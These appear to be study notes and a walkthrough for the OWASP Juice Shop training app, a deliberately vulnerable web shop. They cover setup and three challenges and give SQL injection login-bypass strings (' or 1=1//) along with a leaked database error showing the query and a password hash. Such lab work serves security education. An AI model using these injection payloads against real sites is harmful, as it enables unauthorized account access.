# Juice Shop Project
* Top ten security things in OWASP
* Exploited vulnerabilities in developing websites
* How to translate to spring
* Understand OWASP top 10
* Evaluate Juice Shop
* Open Web Appliation Security Project

## Installation
* [Running OWASP Juice Shop](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/running.html)
* Install [Node.js](http://nodejs.org/)

```
git clone https://github.com/bkimminich/juice-shop.git
cd juice-shop
npm install
npm start
```
* The server begins listening on [port 3000](localhost:3000) by default
`' or 1=1//`
## What is being served?
* A virtual market which vends _mostly_ foods; particularly punny ones.
	* _Raspberry Juice made of Raspberry Pi Microcontrollers_
* Much like amazon, ebay, etsy, etc.



## Objective
* Awareness session
* To demonstrate what Average Joe sees from a typical virtual market
* To demonstrate how Hacker Joe can abuse and eventually break



## Why another broken webapp?
* First application written entirely in JS listed in [OWASP VWA Directory](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)
* First broken webapp that uses the currently popular architecture of an SPA/RIA frontend with a RESTful backend

## What is OWASP?
* **OWASP**
	* Open
	* Web
	* Application
	* Security
	* Project

## What tools may be helpful?
* ZAP or BURP can be useful, but most automated scanners won't help much


## Challenges
### Challenge 1 - Find Scoreboard
* Navigate to `localhost:3000` to view the Juice Shop.
* Open console
* Open source view via the `CMD+U` shortcut.
* Open find-in-page via the `CMD+F` shortcut.
* Search for the string `score-board`
* Navigate to the respective `anchor` tag's `href` [attribute](http://localhost:3000/#/score-board).

### Challenge 2 - Provoke an error that is not gracefully handled
* Navigate to Juice Shop
* Log out
* Log in using
	* **Email:** `' or 1=1//`
	* **Password:** `_`
* Upon clicking the `login` button, an error message reveals a respective user and password

```JSON
{

    "error":{
        "message":"SQLITE_ERROR: near \"/\": syntax error",
        "stack":"SequelizeDatabaseError: SQLITE_ERROR: near \"/\": syntax error\n at Query.formatError (/Users/myUsername/dev/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:423:16)\n at afterExecute (/Users/myUsername/dev/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:119:32)\n at replacement (/Users/myUsername/dev/juice-shop/node_modules/sqlite3/lib/trace.js:19:31)\n at Statement.errBack (/Users/myUsername/dev/juice-shop/node_modules/sqlite3/lib/sqlite3.js:16:21)",
        "name":"SequelizeDatabaseError",
        "parent":{
            "errno":1,
            "code":"SQLITE_ERROR",
            "sql":"SELECT * FROM Users WHERE email = '' or 1=1//' AND password = 'b14a7b8059d9c055954c92674ce60032'"
        },
        "original":{
            "errno":1,
            "code":"SQLITE_ERROR",
            "sql":"SELECT * FROM Users WHERE email = '' or 1=1//' AND password = 'b14a7b8059d9c055954c92674ce60032'"
        },
        "sql":"SELECT * FROM Users WHERE email = '' or 1=1//' AND password = 'b14a7b8059d9c055954c92674ce60032'"
    }

}
```


### Challenge 3 - Login as in Admin
* Navigate to Juice Shop
* Log out
* Log in using
	* **Email:** `' or 1=1;//`
	* **Password:** `_`
* Upon clicking the `login` button you should receive an challenge-achievement for logging in as an Administrator.



## Resources
* [Wiki page](https://www.owasp.org/index.php/OWASP_Juice_Shop_Project)
